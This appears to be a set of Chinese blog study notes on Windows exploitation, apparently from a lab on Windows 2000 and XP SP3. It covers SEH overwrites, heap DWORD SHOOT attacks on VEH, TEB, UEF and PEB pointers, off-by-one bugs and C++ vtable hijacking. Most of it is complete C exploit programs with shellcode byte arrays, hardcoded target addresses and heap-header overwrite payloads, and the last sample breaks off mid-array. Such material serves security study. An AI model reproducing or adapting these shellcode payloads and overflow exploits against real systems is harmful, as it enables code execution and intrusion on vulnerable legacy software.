VectoredHandler ); 如果利用堆溢出的DWORD SHOOT修改指向VEH头节点的指针，在异常处理开始后，能引导程序执行shellcode 攻击TEB中的SEH头节点 线程的SEH链通过TEB第一个DWORD指针指向离栈顶最近的SEH，若修改TEB中这个指针，将在异常发生的时候将程序引导到shellcode中去只执行\n局限性 一个进程存在多个线程 每个线程都有一个TEB 第一个TEB开始于0x7FFDE000 新线程的TEB将紧随前边的TEB，之间相隔0x1000字节，向内存低地址方向增长 多线程程序很难判断当前线程是哪个，以及对应的TEB在什么位置，攻击TEB中SEH头节点的方法一般用于单线程程序 尽管可以创建很多线程或者关闭大量线程去试图控制TEB排列，但是多线程状态下不应该执着地利用TEB了\n攻击UEF 堆溢出时DOWRD SHOOT的target指向UEF的入口，data为shellcode的入口地址，再制造一个只能由UEF来处理的异常\n结合使用跳板技术能够使exploit成功率更高 异常发生时，EDI往往指向堆中离shellcode不远的地方 将UEF的句柄覆盖成一条CALL DWORD PTR [EDI + 0x78]的指令地址就往往可以让程序跳入shellcode 或者CALL DWORD PTR [ESI + 0x4C]或者CALL DWORD PTR [EBP + 0x74]均可 攻击PEB中函数指针 ExitProcess()再清理现场的时候需要进入临界区以同步线程，最终将调用RtlEnterCriticalSection()和RtlLeaceCriticalSection() PEB的地址永远不变，比起TEB来说是更好的选择 off by one的利用 漏洞利用技术的层次：\n基础的栈溢出利用：利用返回地址劫持进程 高级的栈溢出利用：只能淹没部分EBP无法抵达返回地址的利用，如对strncpy函数误用时产生的off by one的利用 堆溢出以及格式化串漏洞的利用 利用 代码片段\n1 2 3 4 5 6 7 8 9 10 11 12 void off_by_one(char * input) { char buf[200]; int i = 0, len = 0; len = sizeof(buf); for(i = 0; input[i]\u0026amp;\u0026amp;(i \u0026lt;= len); i++) { buf[i] = input[i]; } } 此函数试图防止在字符串复制时发生数组越界，但循环中i \u0026lt;= len在边界控制中出错了，可能会溢出一个字节 我们可以在255个字节的范围内控制EBP，也可能控制程序某些重要参数 攻击C++虚函数 理论 C++类的成员函数在声明的时候，若使用了virtual关键字修饰，则是虚函数 一个类中可能由很多个虚函数 虚函数的入口地址被统一保存在虚表(Vtable)中 对象在使用虚函数的时候，先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用 虚表指针保存在对象的内存空间，紧接着虚表指针的是其它成员变量 虚函数只有通过对象指针的引用才能显示出动态调用的特性 尝试 对象中的成员变量溢出后，有机会修改对象中的虚表指针或者修改虚表中的虚函数指针 这样就有可能会执行shellcode 代码尝试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 /* Test on Windows XP SP3 without any other patch. */ #include \u0026#34;windows.h\u0026#34; #include \u0026#34;iostream.h\u0026#34; char shellcode[]= \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xAC\\xBA\\x40\\x00\u0026#34;; // set fake virtual function pointer class Failwest { public: char buf[200]; virtual void test(void) { cout \u0026lt;\u0026lt; \u0026#34;Class Vtable::test()\u0026#34; \u0026lt;\u0026lt; endl; } }; Failwest overflow, *p; void main(void) { char * p_vtable; p_vtable = overflow.buf - 4; // point to virtual table cout \u0026lt;\u0026lt; \u0026#34;Buf Address:\u0026#34; \u0026lt;\u0026lt; \u0026amp;overflow.buf \u0026lt;\u0026lt; endl; // reset fake virtual table to 0x0040BB5C // the address may need to ajusted via runtime debug p_vtable[0] = 0x5C; p_vtable[1] = 0xBB; p_vtable[2] = 0x40; p_vtable[3] = 0x00; strcpy(overflow.buf,shellcode); // set fake virtual function pointer p = \u0026amp;overflow; p-\u0026gt;test(); } 说明 虚表指针位于成员变量char buf[200]之前，程序中通过p_vtable = overflow.buf - 4定位到此指针 修改虚表指向缓冲区0x0040BB5C处，这里是shellcode的末尾，在这里填入0x0040BAAC也就是shellcode的起始地址，程序将跳去执行shellcode 这种方式既不是栈溢出也不是堆溢出，因为对象的内存空间位于堆中，但是却是连续线性覆盖的空间，所以准确的说应该叫做“数组溢出”或者“连续性覆盖” 使用DWORD SHOOT攻击虚表可能会更加简单 ","date":"2020-10-25T15:09:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-009-windows%E5%BC%82%E5%B8%B8%E7%9A%84%E6%B7%B1%E5%85%A5/","title":"漏洞利用学习笔记-009-Windows异常的深入"},{"content":"声明：实验环境为 Windows 2000\n本文来源：Moeomu的博客\nSEH概述 SEH是异常处理结构体(Structure Exception Handler)，是Windows异常处理机制采用的重要的数据结构。每个SEH包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共8个字节 SEH结构存放在栈中 线程初始化时，自动向栈中安装一个SEH作为线程默认的异常处理 如果程序源代码中使用了try-except等异常处理机制，编译器最终通过向当前函数栈帧中安装一个SEH来实现异常处理 栈中一般会同时存在多个SEH 栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB0字节偏移处的指针标识 异常发生时，操作系统会终端程序，首先从TEB的0偏移处去除距离栈顶最近的SEH使用异常处理函数句柄指向的代码来处理异常 当离事故现场最近的异常处理函数运行失败时，将顺着SEH链表依次尝试其它的异常处理函数 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数，此函数将弹出错误对话框然后强制关闭程序 SEH利用思路 SEH存放在栈内，溢出缓冲区的数据可以淹没SEH 将SEH入口改为shellcode起始地址 溢出后错误的栈帧或堆块数据会触发异常 Windows开始处理异常后，将shellcode当作异常处理函数而执行 SEH的栈利用测试 NOP测试 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // next SEH Record \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // SE Handler Function Address \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Nothing \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Nothing \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // EBP \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Return Address ; DWORD MyExceptionhandler(void) { printf(\u0026#34;got an exception, press Enter to kill process!\\n\u0026#34;); getchar(); ExitProcess(1); return 0; } void test(char* input) { char buf[200]; int zero = 0; __asm int 3 // used to break process for debug __try { strcpy(buf, input); // overrun the stack zero = 4 / zero; // generate an exception } __except(MyExceptionhandler()){} } void main() { test(shellcode); } 观察 0x0012FE98地址处时shellcode的起始位置 当前线程一共安装了3个SEH，离栈顶最近的位于0x0012FF68，这是最先调用的SEH 我们要覆盖的地址是0x0012FF6C，这是处理函数的地址，内容填入ShellCode的起始地址即可 实际测试 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; // Next SEH Record \u0026#34;\\x98\\xFE\\x12\\x00\u0026#34;; // SEH Handler DWORD MyExceptionhandler(void) { printf(\u0026#34;got an exception, press Enter to kill process!\\n\u0026#34;); getchar(); ExitProcess(1); return 0; } void test(char * input) { char buf[200]; int zero=0; _try { strcpy(buf,input); //overrun the stack zero=4/zero; //generate an exception } _except(MyExceptionhandler()){} } void main() { test(shellcode); } 观察 弹出MessageBox对话框成功 SEH的堆利用测试 实际测试 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // head of the ajacent free block \u0026#34;\\x88\\x06\\x30\\x00\u0026#34; // 0x00300688 is the address of shellcode in first // Heapblock \u0026#34;\\x30\\xFF\\x12\\x00\u0026#34;; // target of DWORD SHOOT DWORD MyExceptionhandler(void) { ExitProcess(1); return 0; } void main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); memcpy(h1, shellcode, 0x200); // over flow here, noticed 0x200 means //512 ! __asm int 3 // uesd to break the process __try { h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); } __except(MyExceptionhandler()){} } ","date":"2020-10-25T11:32:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-008-windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E5%88%A9%E7%94%A8/","title":"漏洞利用学习笔记-008-Windows异常处理的利用"},{"content":"声明：实验环境为 Windows 2000\n本文来源：Moeomu的博客\n链表的拆卸 理论 堆块分配：将堆块从空表中“卸下” 堆块释放：把堆块链入空表 堆块合并：把若干个堆块从空表中“卸下”，修改块首信息(大小)，之后把更新后的新块“链入”空表 利用堆溢出：构造数据溢出下一个堆块的块首，改写块首中的前向指针和后向指针，然后在分配释放合并等操作发生时伺机获得依次向内存任意地址写入任意数据的机会\n这种向任意位置写入任意数据的机会称为DWORD SHOOT/ARBITARY DWORD RESET 目标 载荷 改写后的结果 栈帧中的函数返回地址 shellcode起始地址 函数返回时，执行shellcode 栈帧中的S.E.H句柄 shellcode起始地址 异常发生时，执行shellcode 重要函数调用地址 shellcode起始地址 函数调用时，执行shellcode 实践 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;windows.h\u0026gt; int main() { HLOCAL h1, h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); _asm int 3//used to break the process //free the odd blocks to prevent coalesing HeapFree(hp,0,h1); HeapFree(hp,0,h3); HeapFree(hp,0,h5); //now freelist[2] got 3 entries //will allocate from freelist[2] which means unlink the last entry //(h5) h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); return 0; } 发现 在h1申请到h5空间的时候，如果此时h5已经被溢出覆盖Blink和Flink，那么将会把[Flink]写入[Blink] 代码植入 原理 目标对准ExitProcess调用的PEB同步函数指针RtlEnterCriticalSection，在程序内堆溢出引发异常后执行shellcode 代码示例1(观察异常) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } 心得 就差ShellCode内容了 代码示例2(不完整) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // 200 字节堆区结束，以下是溢出数据 \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // 下一个堆块的块首，保留 \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } 总结 此次写入了shellcode的部分重要参数，但是主体内容还未写入 代码示例3(有问题) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // Do Something... \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // 200 字节堆区结束，以下是溢出数据 \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // 下一个堆块的块首，保留 \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); // __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } 总结 这就是完整的ShellCode了，可以顺利利用Win2000的堆溢出 但是问题在于无法成功弹出MessageBox 原因是PEB指针连着ShellCode一起欺骗了，需要修复PEB指针 代码示例4(完整) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; //repaire the pointer which shooted by heap over run \u0026#34;\\xB8\\x20\\xF0\\xFD\\x7F\u0026#34; //MOV EAX,7FFDF020 \u0026#34;\\xBB\\x4C\\xAA\\xF8\\x77\u0026#34; //MOV EBX,77F8AA4C the address may releated to //your OS \u0026#34;\\x89\\x18\u0026#34;//MOV DWORD PTR DS:[EAX],EBX \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; 